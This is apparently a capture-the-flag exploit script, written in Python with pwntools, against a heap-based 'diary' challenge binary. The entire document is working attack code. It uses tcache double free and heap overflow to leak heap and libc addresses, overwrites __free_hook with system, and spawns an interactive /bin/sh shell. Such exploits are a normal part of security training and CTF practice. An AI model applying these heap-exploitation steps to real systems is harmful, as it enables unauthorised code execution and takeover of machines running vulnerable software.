from pwn import *
from LibcSearcher import *
context.log_level = 'DEBUG'
context.arch = 'amd64'

p = process('./diary')#remote('', 5021)
e = ELF('./diary')
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
one_gadget = 0xe6e73

def cmd(index:int):
    p.recvuntil(b'Options')
    p.sendline(str(index).encode())

def new(name, size:int, content):
    cmd(1)
    p.recvuntil(b"Name:")
    p.sendline(name)
    p.recvuntil(b"Size:")
    p.sendline(str(size).encode())
    p.recvuntil(b"Content:")
    p.sendline(content)

def edit(name, content):
    cmd(2)
    p.recvuntil(b"Name:")
    p.sendline(name)
    p.recvuntil(b"bytes:")
    p.sendline(content)

def free(name):
    cmd(3)
    p.recvuntil(b"Name:")
    p.sendline(name)

def guess():
    cmd(4)

def exp():
    new('arttnba1', 0x10, '/bin/sh\x00')
    new('arttnba0', 0x10, 'arttnba0')
    new('arttnba2', 0x20, 'arttnba2')
    new('shell', 0x30, 'shell')
    new('sheep', 0x30, 'sheep')
    #gdb.attach(p)
    
    # fill the tcache
    for i in range(5):
        free('arttnba0')
        edit('arttnba0', '')
    for i in range(5):
        free('shell')
        edit('shell', '')
    for i in range(5):
        free('arttnba2')
        edit('arttnba2', '')

    # leak the heap addr
    free('arttnba2')
    p.recv()
    cmd(2)
    p.recvuntil(b"Name:")
    p.sendline('arttnba2')
    p.recvuntil(b"Input")
    heap_addr = int(p.recvuntil('bytes', drop = True), 16)
    p.sendline('')
    
    
    new('arttnba3', 0x90, 'arttnba3')
    # fill the tcache
    for i in range(7):
        free('arttnba3')
        edit('arttnba3', '')

    # leak the libc
    free('arttnba3')
    p.recv()
    cmd(2)
    p.recvuntil(b"Name:")
    p.sendline('arttnba3')
    p.recvuntil(b"Input")
    main_arena = int(p.recvuntil('bytes', drop = True), 16) - 96
    p.sendline(p64(main_arena + 96)) # fix the heap
    malloc_hook = main_arena - 0x10
    libc_base = malloc_hook - libc.sym['__malloc_hook']
    log.info('libc addr: ' + hex(libc_base))

    #gdb.attach(p)
    # tcache double free
    edit('arttnba0', b'A' * (0x8 + 0x50) + p64(0) + p64(0x31) + b'A' * 0 + p64(libc_base + libc.sym['__free_hook'] - 8) * 3)
    new('arttnba7', 0x20, p64(libc_base + libc.sym['system'])*2)
    new('freehook', 0x20, p64(libc_base + libc.sym['system'])*2)
    #gdb.attach(p)
    #p.interactive()
    edit('shell', b'A' * (0x8 + 0x20 + 0x50) + p64(0) + p64(0x41) + b'A' * 0 + b'/bin/sh\x00' * 10)
    #gdb.attach(p)
    free('sheep') # system("/bin/sh")
    p.interactive()


if __name__ == '__main__':
    exp()
